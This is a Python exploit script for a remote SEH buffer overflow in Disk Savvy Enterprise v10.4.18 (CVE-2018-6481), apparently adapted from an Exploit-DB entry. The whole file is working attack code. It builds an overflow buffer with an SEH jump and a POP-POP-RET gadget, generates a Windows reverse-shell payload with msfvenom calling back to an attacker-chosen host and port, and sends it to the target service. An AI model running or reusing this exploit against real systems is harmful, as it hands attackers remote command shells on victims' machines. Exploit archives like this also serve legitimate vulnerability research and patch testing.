#!/usr/bin/python
# Disk Savvy Enterprise v10.4.18 - Remote Buffer Overflow
# Author: H4rk3nz0, all credit to Daniel Teixeira
# Original Exploit: https://www.exploit-db.com/exploits/44156
# CVE: CVE-2018-6481
# Installer: https://www.exploit-db.com/apps/901063fbd6cbafeee9d4641cee343a90-disksavvyent_setup_v10.4.18.exe

import sys
import socket
import time
import os
import struct

junk = "A" * 124
nseh = "\x90\x09\xeb\x05"	    # JMP over seh
seh = "\x13\x6d\x05\x10"	    # POP EBX # POP ECX # RET 0x20 [libspp.dll]
nops = "\x90" * 10
add_esp = "\x83\xc4\x64" * 20	# ADD ESP,100
jmp_esp = "\xff\xe4"		    # JMP ESP

def main():
	print("[+] GENERATING SHELLCODE")
	shellcode =  os.system("""msfvenom -p windows/shell_reverse_tcp LHOST=""" + lhost + """ LPORT=""" + lport + """ -f python -b """ + r"""'\x00\x02\x0a\x0d\xf8\xfd' -o shellcode.txt""")
	print("\n[+] TIDYING SHELLCODE")
	r = open("shellcode.txt", "r")
	buf = r.read()
	buf = buf.replace("buf += b\"", "")
	buf = buf.replace("buf =  b\"\"", "")
	buf = buf.replace("\n", "")
	buf = buf.replace("\"", "")
	buf = buf.replace("\\x", "")
	buf = buf.decode("hex")
	r.close()
	os.system("rm shellcode.txt")
	print("[+] MAKING IT LOOK SAVVY")
	payload = junk + nseh + seh + nops + add_esp + jmp_esp
	payload += "\x90" * (1000 - len(payload) - len(buf))
	payload += buf
	header = "\x75\x19\xba\xab\x03\x00\x00\x00\x00\x40\x00\x00"
	header += struct.pack('<I', len(payload))
	header += struct.pack('<I', len(payload))
	header += struct.pack('<I', ord(payload[-1]))
	request = header + payload
	print("[+] TYPING COOKIE")
	try:
		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client.connect((host, port))
		client.send(request)
		client.close()
		print("[?] Check listener on port " + lport)
	except:
		print("[-] An Error occurred when connecting to target port, is target app running?\n")


if __name__=="__main__":
	try:
		host = sys.argv[1]
		port = int(sys.argv[2])
		str_port = str(port)
		lhost = sys.argv[3]
		lport = str(sys.argv[4])
		main()
	except:
		print("[!] USAGE EXAMPLE: python " + sys.argv[0] + " <target-ip> <target-port> <local-ip> <local-port>")